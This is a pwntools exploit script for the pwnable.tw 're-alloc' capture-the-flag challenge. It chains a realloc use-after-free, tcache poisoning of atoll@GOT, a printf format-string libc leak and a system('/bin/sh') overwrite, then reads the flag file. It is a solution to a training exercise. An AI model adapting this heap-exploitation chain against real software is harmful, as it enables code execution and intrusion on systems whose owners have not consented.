#!/usr/bin/env python3
from pwn import *

PORT = 10106
HOST = "chall.pwnable.tw"
elf = context.binary = ELF('./re-alloc_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            b* 0x0000000000401724
            b* 0x00000000004013F1
            b* 0x0000000000401632
            b* 0x000000000040155C
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

#GDB()

def menu(opt):
    p.sendlineafter(b'Your choice: ', str(opt).encode())

def alloc(index, size, data):
    menu(1)
    p.sendlineafter(b'Index:', str(index).encode())
    p.sendlineafter(b'Size:', str(size).encode())
    p.sendafter(b'Data:', data)


def realloc(index, size, data=b''):
    menu(2)
    p.sendlineafter(b'Index:', str(index).encode())
    p.sendlineafter(b'Size:', str(size).encode())

    if size != 0:
        p.sendafter(b'Data:', data)


def free(index):
    menu(3)
    p.sendlineafter(b'Index:', str(index).encode())

# Stage 1: Trigger atoll -> printf to format string for leaking libc_base

## [0x30]: atoll@GOT
alloc(1, 0x20, b'A'*0x20)
realloc(1, 0)
realloc(1, 0x20, p64(elf.got.atoll))

alloc(0, 0x20, b'B'*0x20)

realloc(1, 0x30, b'C'*0x30)
free(1)

realloc(0, 0x30, b'D'*0x30)
free(0)

## [0x50]: atoll@GOT
alloc(1, 0x40, b'A'*0x40)
realloc(1, 0)
realloc(1, 0x40, p64(elf.got.atoll))

alloc(0, 0x40, b'B'*0x40)

realloc(1, 0x50, b'C'*0x50)
free(1)
realloc(0, 0x50, b'D'*0x50)
free(0)

# GDB()
alloc(0, 0x20, p64(elf.plt.printf))

menu(1)
p.sendlineafter(b'Index:', b'%6$p')
libc.address = int(p.recvline().strip(), 16) - 0x1e5760
log.success(f'libc_base: {libc.address:#x}')

# Stage 2: Trigger atoi@got -> system("/bin/sh")

menu(1)
# GDB()
p.sendlineafter(b'Index:', b'')
p.sendlineafter(b'Size:', f'%{0x40-1}c'.encode())
p.sendafter(b'Data:', p64(libc.sym.system))

menu(1)
p.sendlineafter(b'Index:', b'/bin/sh\0')

p.sendline(b'cat /home/re-alloc/flag')

p.interactive()
# d1nhdwc